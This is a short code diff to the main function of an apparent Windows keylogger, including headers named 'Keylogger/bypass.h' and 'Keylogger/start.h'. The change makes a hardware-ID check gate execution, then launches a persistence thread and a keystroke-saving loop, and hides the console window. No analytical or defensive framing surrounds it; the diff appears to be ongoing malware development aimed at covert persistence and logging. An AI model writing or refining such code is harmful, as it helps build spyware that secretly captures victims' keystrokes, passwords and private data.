@@ -5,10 +5,12 @@
 #include "Keylogger/bypass.h"
 #include "Keylogger/start.h"
 int main() {
-	std::thread t[3];
-	t[0] = std::thread(HWIDCheck);
-	t[1] = std::thread(PersistantApplication);
-	t[2] = std::thread(saveLoop);
+	std::thread t[2];
+	if(!HWIDCheck()) {
+		exit(0);
+	}
+	t[0] = std::thread(PersistantApplication);
+	t[1] = std::thread(saveLoop);
 	
 
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
